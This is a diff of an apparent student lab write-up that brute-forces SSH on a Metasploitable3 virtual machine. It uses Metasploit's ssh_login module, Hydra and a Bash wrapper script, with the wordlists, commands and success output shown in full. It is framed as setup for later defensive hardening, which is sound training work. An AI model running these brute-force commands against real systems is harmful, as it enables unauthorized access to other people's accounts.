@@ -1,56 +1,154 @@
-# Phase #1 – Setup and Compromise the Service
+# Phase 1 – Setup and Compromise the Service
 
 ## Objective
 
 Set up the attacker and victim environments, then compromise a vulnerable SSH service using two methods:
 
-- Phase 1.1: Brute-force attack using a wordlist (Hydra)
-- Phase 1.2: Bash script with Hydra to automate the process
+* **Phase 1.1**: Brute-force attack using Metasploit and custom wordlists
+* **Phase 1.2**: Automated brute-force attack using a Bash script with Hydra
+
+---
 
 ## Environment Setup
 
-- Attacker Machine: Kali Linux
+* **Attacker Machine**: Kali Linux
 
-  Hostname: kali
+  * Hostname: `kali`
+  * Host-Only IP Address: `192.168.56.104`
+  * NAT IP Address: `10.0.2.15`
+  * Username: `kali`
 
-  Host-Only IP Address: 192.168.56.104
+* **Victim Machine**: Metasploitable3
 
-  NAT IP Address: 10.0.2.15
+  * Hostname: `metasploitable3`
+  * Host-Only IP Address: `192.168.56.103`
+  * NAT IP Address: `10.0.2.2`
+  * Username: `vagrant`
+  * Password: `vagrant`
 
-  Username: kali
+* **Targeted Service**
 
-- Victim Machine: Metasploitable3
+  * **Service**: SSH
+  * **Port**: 22
+  * **Vulnerability**: Default/weak credentials
+  * **Goal**: Compromise SSH access via brute-force attack
 
-  Hostname: metasploitable3
+---
 
-  Host-Only IP Address: 192.168.56.103
+## Phase 1.1 – SSH Brute-Force Attack Using Metasploit
 
-  NAT IP Address: 10.0.2.2
+### 1. Launch Metasploit Framework
 
-  Username: vagrant
+We started Metasploit with:
 
-  Password: vagrant
+```bash
+msfconsole
+```
 
-## Targeted Service
+![Metasploit Launch](./Phase1_Screenshots/metasploit-launch.png)
 
-- **Service:** SSH
-- **Port:** 22
-- **Vulnerability Type:** Weak/default credentials
-- **Goal:** Compromise SSH access through brute-force login
+---
 
-## Phase 1.1 – Hydra Brute-Force Attack Using Wordlists
+### 2. Select and Configure Module
 
-### 1. Connectivity Check
+We selected the SSH login module:
 
-Confirmed Kali can reach Metasploitable3 via ping:
+```bash
+use auxiliary/scanner/ssh/ssh_login
+```
+
+We then configured the target:
+
+```bash
+set RHOSTS 192.168.56.103
+```
+
+![Select Module](./Phase1_Screenshots/select-module.png)
+
+---
+
+### 3. Prepare and Load Wordlists
+
+We created two files:
+
+**user.txt**
+
+```
+msfadmin
+user
+postgres
+vagrant
+Rana
+Sarah
+Password
+```
+
+**pass.txt**
+
+```
+msfadmin
+123456
+toor
+password
+vagrant
+123456789
+101918
+```
+
+We set these files in Metasploit:
+
+```bash
+set USER_FILE user.txt
+set PASS_FILE pass.txt
+set VERBOSE true
+```
+
+![Wordlists Setup](./Phase1_Screenshots/set-wordlists.png)
+
+---
+
+### 4. Run the Attack
+
+```bash
+run
+```
+
+Metasploit attempted multiple combinations. It successfully logged in using:
+
+* **Username**: `vagrant`
+* **Password**: `vagrant`
+
+```text
+[+] 192.168.56.103:22 - Success: 'vagrant:vagrant'
+```
+
+![SSH Login Success](./Phase1_Screenshots/ssh-success.png)
+
+---
+
+### Summary
+
+We successfully brute-forced the SSH credentials on Metasploitable3 using Metasploit and a dictionary attack. This confirms that the service is vulnerable due to default credentials.
+
+---
+
+## Phase 1.2 – Automated Hydra Attack Using Bash Script
+
+### 1. Connectivity Test
+
+We first verified that the attacker can reach the victim via `ping`:
 
 ```bash
 ping 192.168.56.103
 ```
 
-![Screenshot of results] (image-10.png)
+![Ping Test](./Phase1_Screenshots/ping-success.png)
 
-### 2. Created Username and Password Lists
+---
+
+### 2. Prepare Username and Password Lists
+
+We created the following files:
 
 **user.txt**
 
@@ -61,7 +159,7 @@ postgres
 vagrant
 ```
 
-![Screenshot of results](image-8.png)
+![User List](./Phase1_Screenshots/user-list.png)
 
 **pass.txt**
 
@@ -73,28 +171,32 @@ password
 vagrant
 ```
 
-![Screenshot of results](image-9.png)
+![Password List](./Phase1_Screenshots/pass-list.png)
 
-### 3. Ran Hydra Using Both Files
+---
 
-Command used:
+### 3. Run Hydra
+
+Using the following command:
 
 ```bash
 hydra -L user.txt -P pass.txt ssh://192.168.56.103 -t 4
 ```
 
-Result:
+Hydra successfully found:
 
-- Hydra successfully found the credentials:
-  - **Username:** `vagrant`
-  - **Password:** `vagrant`
-    ![Screenshot of results](image-11.png)
+* **Username**: `vagrant`
+* **Password**: `vagrant`
 
-## Phase 1.2 – Custom Scripted Attack (Hydra + Bash)
+![Hydra Success](./Phase1_Screenshots/hydra-success.png)
 
-### 1. Created Bash Script
+---
 
-**ssh_bruteforce.sh**
+### 4. Bash Script Execution
+
+We automated the attack with the following script:
+
+**ssh\_bruteforce.sh**
 
 ```bash
 #!/bin/bash
@@ -108,21 +210,22 @@ echo "[*] Starting SSH brute-force attack on $TARGET_IP..."
 hydra -l "$USERNAME" -P "$PASSWORD_LIST" ssh://"$TARGET_IP" -t 4 -f -V
 ```
 
-![Screenshot of results](image-7.png)
+![Script Code](./Phase1_Screenshots/script-code.png)
 
-### 2. Ran the Script
+Then ran:
 
 ```bash
 chmod +x ssh_bruteforce.sh
 ./ssh_bruteforce.sh
 ```
 
-Output confirmed the attack was successful with valid credentials found:
+Output confirmed success:
 
-- **Username:** `vagrant`
-- **Password:** `vagrant`
-  ![Screenshot of results](image-5.png)
+![Script Output](./Phase1_Screenshots/script-output.png)
+
+---
 
 ## Conclusion
 
-The SSH service on Metasploitable3 was successfully compromised using Hydra with both a custom wordlist and a Bash script. This confirms the service’s vulnerability to brute-force attacks due to the use of default credentials. The machine is now ready for defensive countermeasures.
+In both Phase 1.1 and 1.2, we successfully compromised the Metasploitable3 SSH service using dictionary-based brute-force attacks. The presence of weak/default credentials (`vagrant:vagrant`) made the system vulnerable. This confirms the need for further security hardening in the upcoming phases.
+
